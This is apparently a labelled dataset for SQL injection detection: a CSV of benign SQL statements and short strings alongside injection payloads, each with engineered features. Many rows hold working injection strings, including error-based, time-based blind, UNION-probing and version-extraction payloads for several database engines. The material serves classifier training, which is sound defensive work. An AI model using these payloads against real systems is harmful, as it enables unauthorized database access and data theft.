Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"1""  )   where 9680  =  9680 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,where and select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78,269,13,0,1,8,1,44,1,4,54,8,3
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,1,rlike select case when then else 0x28 end and czqk like czqk,138,12,4,0,1,0,26,1,0,46,9,0
-6341' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'ugys'  =  'ugys,1,or qqpjq select case when then else end from rdb database qzvzq and ugys ugys,140,15,8,0,7,0,25,2,1,63,9,1
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,and select from select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from information_schema character_sets group by,253,17,0,1,9,0,44,1,2,97,8,5
waitfor delay '0:0:5'#,1,waitfor delay,22,2,2,0,3,1,2,0,0,12,0,2
select social ( s )  from test,0,select social from test,30,4,0,0,0,0,6,0,0,21,2,0
jezabel,0,jezabel,7,1,0,0,0,0,0,0,0,7,0,0
"-9864""  )   or elt  (  5885  =  4936,4936  )   and   (  ""bfbb"" like ""bfbb",1,or elt and bfbb like bfbb,73,6,0,4,2,0,13,2,1,20,3,1
entendimiento,0,entendimiento,13,1,0,0,0,0,0,0,0,13,0,0
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",1,and make_set and ojag ojag,74,5,4,0,4,0,13,2,0,21,2,1
-3096' or 3821  =  5539 and 'zrth'  =  'zrth,1,or and zrth zrth,44,4,4,0,2,0,8,2,1,13,2,0
"c/ ciudadela 188, 4?f",0,ciudadela,21,1,0,0,2,0,3,0,1,11,0,0
select * from spoken where price = 'are' limit 3,0,select from spoken where price are limit,48,7,2,0,1,0,9,0,1,34,4,0
select min ( price )  as smallestprice from products;,0,select min price as smallestprice from products,53,7,0,0,1,0,8,0,0,41,3,0
-9217 or 9323  =  9323#,1,or,23,1,0,0,2,1,4,1,1,2,0,0
select * from symbol where price not between 10 and 20,0,select from symbol where price not between and,54,8,0,0,0,0,10,2,1,39,6,0
c6,0,c6,2,1,0,0,0,0,0,0,0,1,0,0
"-3436  )   or elt  (  1032  =  1032,3623  )  ",1,or elt,45,2,0,0,2,0,9,1,1,5,1,1
delete from thou where needs = 'force',0,delete from thou where needs force,38,6,2,0,1,0,6,0,0,29,3,0
elwes@enla.nu,0,elwes enla nu,13,3,0,0,2,0,0,0,0,11,0,0
9570,0,,4,0,0,0,0,0,0,0,0,0,0,0
hengevel,0,hengevel,8,1,0,0,0,0,0,0,0,8,0,0
5.79858e+15,0,79858e,11,1,0,0,1,0,0,0,1,1,0,0
select count ( characteristic ) from shorter,0,select count characteristic from shorter,44,5,0,0,0,0,6,0,0,36,2,1
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1,select from users where id union select version,80,8,0,0,6,1,17,0,5,40,5,1
"insert into lips  ( good, jump, around )  values  ( 'silk', 'income', 'throughout' )  ",0,insert into lips good jump around values silk income throughout,86,10,6,0,4,0,14,0,0,54,3,0
8695,0,,4,0,0,0,0,0,0,0,0,0,0,0
49699,0,,5,0,0,0,0,0,0,0,0,0,0,0
b3m85rd493,0,b3m85rd493,10,1,0,0,0,0,0,0,0,4,0,0
select mostly from expect union all select related from finish order by pipe,0,select mostly from expect union all select related from finish order by pipe,76,13,0,0,0,0,12,0,0,64,8,0
"1%'   )    )     )   union all select null,null,null,null,null,null,null--",1,union all select null null null null null null null,74,10,1,0,7,1,7,0,2,42,10,0
dobbing3,0,dobbing3,8,1,0,0,0,0,0,0,0,7,0,0
"  select electric as perhaps, see as [like]  from hill",0,select electric as perhaps see as like from hill,54,9,0,0,3,0,9,0,0,40,5,0
" select * from air order by select asc, got desc",0,select from air order by select asc got desc,48,9,0,0,1,0,10,0,1,36,7,0
1'+  (  select aqhj where 4419  =  4419,1,select aqhj where,39,3,1,0,1,0,7,0,1,15,2,0
"1   )    )    as queb where 2449  =  2449 union all select null,null#",1,as queb where union all select null null,69,8,0,0,3,1,12,0,0,33,7,0
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,select from users where id union select null banner from version where rownum,104,13,3,0,4,1,19,0,3,66,8,1
"  select left ( ""sql tutorial"", 3 )  as extractstring;",0,select left sql tutorial as extractstring,54,6,0,2,2,0,9,0,0,36,3,1
"  (  select   (  case when   (  4232  =  4232  )   then   (  select benchmark  (  5000000,md5  (  0x6b637544   )    )     )   else 4232*  (  select 4232 from mysql.db  )   end   )    )   ",1,select case when then select benchmark md5 0x6b637544 else select from mysql db end,187,14,0,0,3,0,33,0,1,61,9,2
"1' and elt  (  2266  =  7467,7467  )  ",1,and elt,38,2,1,0,2,0,8,1,0,6,1,1
"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",1,union all select,60,3,0,1,7,1,5,0,1,14,3,0
"-7333%""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,1,or qqpjq select case when then else end from rdb database qzvzq and,168,13,4,4,9,0,31,2,1,55,9,1
select distinct name from dance,0,select distinct name from dance,31,5,0,0,0,0,4,0,0,27,3,0
select chemical ( s )  from coat union,0,select chemical from coat union,38,5,0,0,0,0,7,0,0,28,3,0
9.30174e+15,0,30174e,11,1,0,0,1,0,0,0,1,1,0,0
select top 50 percent * from oxygen,0,select top percent from oxygen,35,5,0,0,0,0,6,0,1,26,3,0
" select * from users where id  =  1 or $<\\. union select 1,@@version -- 1",1,select from users where id or union select version,73,9,0,0,8,1,15,1,4,42,6,1
"c/ 57 15, 9g",0,9g,12,1,0,0,1,0,3,0,1,2,0,0
1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,1,select vuku where waitfor delay,66,5,5,0,5,1,10,0,2,27,2,2
"   select breakfast,golden,spider,ship,magnet     (  (  clothes join mind on may.while =  neighbor.writing )   inner join bareon orders.definition =  phrase.principalid ) ",0,select breakfast golden spider ship magnet clothes join mind on may while neighbor writing inner join bareon orders definition phrase principalid,171,21,0,0,10,0,20,0,0,125,5,0
&,1,,1,0,0,0,1,0,0,0,0,0,0,0
select * from inch,0,select from inch,18,3,0,0,0,0,3,0,1,14,2,0
select saved,0,select saved,12,2,0,0,0,0,1,0,0,11,1,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  '%'  =  '",1,select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and,116,16,3,0,7,0,17,1,1,72,6,1
"1%' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,or like abcdefg upper hex randomblob,105,6,3,0,3,1,17,1,3,31,2,3
if  (  8995  =  9787  )   select 8995 else drop function ofgg--,1,if select else drop function ofgg,63,6,0,0,1,1,11,0,2,28,4,1
select min ( purpose )  as caught from throughout,0,select min purpose as caught from throughout,49,7,0,0,0,0,8,0,0,38,3,0
"1""  )   where 9359  =  9359 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,where or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,154,21,0,1,9,1,26,1,3,76,8,1
delete from body,0,delete from body,16,3,0,0,0,0,2,0,0,14,2,0
"1"" where 4281  =  4281",1,where,22,1,0,1,1,0,4,0,0,5,0,0
bees3,0,bees3,5,1,0,0,0,0,0,0,0,4,0,0
select * from bend where wait = 'anything'  or cage = 'list',0,select from bend where wait anything or cage list,60,9,4,0,2,0,11,1,1,41,4,0
-6661'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'tbmu' like 'tbmu,1,or in char char char char char select case when then char else char end char char char char char and tbmu like tbmu,378,24,4,0,1,0,79,2,11,92,10,12
1'  )   as epgz where 2898  =  2898 and 7028  =  2287#,1,as epgz where and,54,4,1,0,3,1,11,1,0,14,3,0
select * from teacher where calm between 'accept' and 'offer',0,select from teacher where calm between accept and offer,61,9,4,0,0,0,9,1,1,47,5,0
1  )   where 9446  =  9446 union all select null#,1,where union all select null,49,5,0,0,2,1,9,0,0,23,5,0
select * from  ( select natural from run ) ,0,select from select natural from run,43,6,0,0,0,0,9,0,1,30,4,0
select * from nearly fetch first 3 rows only select top 50 percent * from fully,0,select from nearly fetch first rows only select top percent from fully,79,12,0,0,0,0,15,0,2,59,6,0
"1 where 4468  =  4468 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,where or char char char char regexp_substring repeat left crypt_key char char char null null,251,15,0,0,18,1,51,1,2,76,5,11
"select customers.customername, orders.orderid from customers full outer join orderson customers.customerid = orders.customerid order by customers.customername;",0,select customers customername orders orderid from customers full outer join orderson customers customerid orders customerid order by customers customername,159,19,0,0,8,0,14,0,0,137,6,0
"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",1,as xebq where union all select null null null null null null,90,12,1,0,7,1,12,0,0,49,11,0
select * from cell fetch first 50 percent rows only,0,select from cell fetch first percent rows only,51,8,0,0,0,0,9,0,1,39,3,0
fazenda_heigh@unanuevavisionenortodoncia.gh,0,fazenda_heigh unanuevavisionenortodoncia gh,43,3,0,0,3,0,0,0,0,40,0,0
hoyt,0,hoyt,4,1,0,0,0,0,0,0,0,4,0,0
-2300  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,or dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,343,21,0,0,26,0,70,1,1,90,8,12
select * from language fetch first 3 rows only select top 50 percent * from are,0,select from language fetch first rows only select top percent from are,79,12,0,0,0,0,15,0,2,59,6,0
select * from down 3,0,select from down,20,3,0,0,0,0,4,0,1,14,2,0
"-8506'   )    )     )   union all select 1950,1950,1950,1950,1950,1950--",1,union all select,72,3,1,0,5,1,7,0,3,14,3,0
armintario,0,armintario,10,1,0,0,0,0,0,0,0,10,0,0
select top 3 * from leaf where element = 'involved',0,select top from leaf where element involved,51,7,2,0,1,0,9,0,1,37,4,0
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",1,or benchmark md5 0x694a4745 and ntaw ntaw,88,7,4,0,3,0,14,2,0,26,2,2
"   select opportunity, ear, potfrom fat where four  is not null",0,select opportunity ear potfrom fat where four is not null,63,10,0,0,2,0,10,1,0,48,5,0
select avg ( moon ) from saw select sum ( concerned ) ,0,select avg moon from saw select sum concerned,54,8,0,0,0,0,12,0,0,38,3,2
select top 3 * from lake where correct = 'him' select * from tube,0,select top from lake where correct him select from tube,65,10,2,0,1,0,13,0,2,46,6,0
select top 3 * from theory where friendly = 'he',0,select top from theory where friendly he,48,7,2,0,1,0,9,0,1,34,4,0
"insert into got  ( buried, human, plural )  values  ( 'steam', 'likely', 'third' )  ",0,insert into got buried human plural values steam likely third,84,10,6,0,4,0,14,0,0,52,3,0
besnehard8@itrends.tn,0,besnehard8 itrends tn,21,3,0,0,2,0,0,0,0,18,0,0
"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",1,and elt and yfaa like yfaa,84,6,4,0,2,0,15,2,0,21,3,1
"1%' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,and select count from domain domains as t1 domain columns as t2 domain tables as t3,119,16,1,0,7,1,19,1,3,65,6,1
25585710g,0,25585710g,9,1,0,0,0,0,0,0,0,1,0,0
senen,0,senen,5,1,0,0,0,0,0,0,0,5,0,0
select count ( top ) from model,0,select count top from model,31,5,0,0,0,0,6,0,0,23,3,1
"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",1,as gazd where union all select,93,6,0,1,7,1,11,0,3,25,5,0
1  )   as jtfx where 8038  =  8038,1,as jtfx where,34,3,0,0,1,0,7,0,0,11,2,0
select * from does where four = 'understanding' limit 3,0,select from does where four understanding limit,55,7,2,0,1,0,9,0,1,41,4,0
"1"" where 7005  =  7005",1,where,22,1,0,1,1,0,4,0,0,5,0,0
"   select hand, cook+ ', ' + audience+ ' ' + main+ ', ' + avoid as adventure  from acres",0,select hand cook audience main avoid as adventure from acres,88,10,6,0,3,0,19,0,6,51,3,0
"1' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,and select count from generate_series,93,5,1,0,3,1,16,1,3,32,3,1
"1  )   as wbcd where 9506  =  9506 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,as wbcd where or row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by,325,24,0,0,9,1,63,1,5,109,15,5
8.3888e+15,0,3888e,10,1,0,0,1,0,0,0,1,1,0,0
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'tjvy' like 'tjvy,1,and select from select sleep fzno and tjvy like tjvy,125,10,4,0,0,0,24,2,1,43,6,1
"-3733'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'ybgd'  =  'ybgd",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and ybgd ybgd,376,25,4,0,26,0,77,2,1,91,9,10
"  select waitid as id, where as apartment from closely",0,select waitid as id where as apartment from closely,54,9,0,0,1,0,9,0,0,43,5,0
-2348  )   as sige where 1639  =  1639 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,as sige where or cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric,370,24,0,0,25,1,79,1,3,85,10,10
julieta,0,julieta,7,1,0,0,0,0,0,0,0,7,0,0
tinajas,0,tinajas,7,1,0,0,0,0,0,0,0,7,0,0
select top 50 percent * from kept,0,select top percent from kept,33,5,0,0,0,0,6,0,1,24,3,0
"-8472'  )   where 3340  =  3340 or make_set  (  1752  =  9905,9905  )  --",1,where or make_set,73,3,1,0,4,1,13,1,3,14,2,1
"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",1,union all select,66,3,0,1,5,1,7,0,1,14,3,0
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'sqvt' like 'sqvt,1,and qqpjq select case when then else end from rdb database qzvzq and sqvt like sqvt,138,16,8,0,6,0,25,2,0,68,10,1
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,select from users where id or or,63,7,0,2,3,1,18,2,3,26,5,0
"1"" where 7828  =  7828",1,where,22,1,0,1,1,0,4,0,0,5,0,0
"1' where 2160  =  2160 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,where and exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78,193,12,1,0,7,1,35,1,3,49,6,3
select mood from power,0,select mood from power,22,4,0,0,0,0,3,0,0,19,2,1
select * from become where spend between '1996-07-01' and '1996-07-31',0,select from become where spend between and,70,7,4,0,0,0,9,1,5,36,5,0
"select * from thy where stems between ""suit"" and    ""breath""",0,select from thy where stems between suit and breath,60,9,0,4,0,0,9,1,1,43,5,0
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud",1,or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and iaud iaud,182,23,4,0,9,0,30,2,1,82,8,1
rustir,0,rustir,6,1,0,0,0,0,0,0,0,6,0,0
select top 3 * from gravity where men = 'her',0,select top from gravity where men her,45,7,2,0,1,0,9,0,1,31,4,0
-7175' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'upzo'  =  'upzo,1,or utl_inaddr get_host_address chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and upzo upzo,347,24,4,0,27,0,70,2,1,99,9,10
